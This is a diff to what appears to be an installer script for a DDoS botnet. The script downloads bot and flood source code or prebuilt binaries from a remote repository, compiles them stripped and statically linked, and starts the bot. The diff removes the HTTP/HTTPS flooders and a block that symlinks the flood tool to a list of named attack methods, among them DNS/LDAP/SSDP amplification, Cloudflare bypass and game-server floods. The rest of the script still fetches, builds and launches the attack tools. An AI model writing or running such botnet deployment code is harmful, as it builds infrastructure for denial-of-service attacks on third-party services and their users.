@@ -81,8 +81,6 @@ if [ -n "${COMPILER}" ]; then
     echo "[*] Compiler found (${COMPILER}). Compiling natively for ${ARCH}..."
     download_file "${REPO_BASE}/bots/bot.cpp" "bot.cpp" || true
     download_file "${REPO_BASE}/bots/flood.cpp" "flood.cpp" || true
-    download_file "${REPO_BASE}/bots/http.cpp" "http.cpp" || true
-    download_file "${REPO_BASE}/bots/https.cpp" "https.cpp" || true
     
     # Check if OpenSSL dev library is available
     SSL_FLAGS=""
@@ -96,29 +94,13 @@ if [ -n "${COMPILER}" ]; then
 
     ${COMPILER} -Os -s -fno-exceptions -fno-rtti -static-libstdc++ -static-libgcc -o bot bot.cpp || ${COMPILER} -O2 -o bot bot.cpp
     ${COMPILER} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o flood flood.cpp ${SSL_FLAGS} || ${COMPILER} -O2 -pthread -o flood flood.cpp ${SSL_FLAGS}
-    ${COMPILER} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o http http.cpp || ${COMPILER} -O2 -pthread -o http http.cpp
-    if [ -n "${SSL_FLAGS}" ] && [ "${SSL_FLAGS}" != "-DNO_SSL" ]; then
-        ${COMPILER} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o https https.cpp ${SSL_FLAGS} || true
-    fi
 else
     echo "[*] No native C++ compiler found. Downloading prebuilt binaries for ${BIN_ARCH}..."
     download_file "${REPO_BASE}/bots/bot-${BIN_ARCH}" "bot" || download_file "${REPO_BASE}/bots/bot" "bot" || true
     download_file "${REPO_BASE}/bots/flood-${BIN_ARCH}" "flood" || download_file "${REPO_BASE}/bots/flood" "flood" || true
-    download_file "${REPO_BASE}/bots/http-${BIN_ARCH}" "http" || download_file "${REPO_BASE}/bots/http" "http" || true
 fi
 
-chmod +x bot flood http https 2>/dev/null || true
-
-# 6. Create method symlinks for flood.cpp
-echo "[*] Configuring attack method symlinks..."
-METHODS="dns udp ldap ssdp home udpbypass tcp socket ovh tcpmix tcpbypass ack game rainbow rocket roblox fivem pubg fortnite warthunder counter samp subnet icmp httpx rapidflood tls tlsx bypass browser cache cloudflare https"
-
-for m in $METHODS; do
-    if [ -f "flood" ]; then
-        ln -sf flood "$m" 2>/dev/null || cp flood "$m" 2>/dev/null || true
-        chmod +x "$m" 2>/dev/null || true
-    fi
-done
+chmod +x bot flood 2>/dev/null || true
 
 echo "[+] Setup completed successfully for ${ARCH}!"
 echo "[+] Starting bot..."
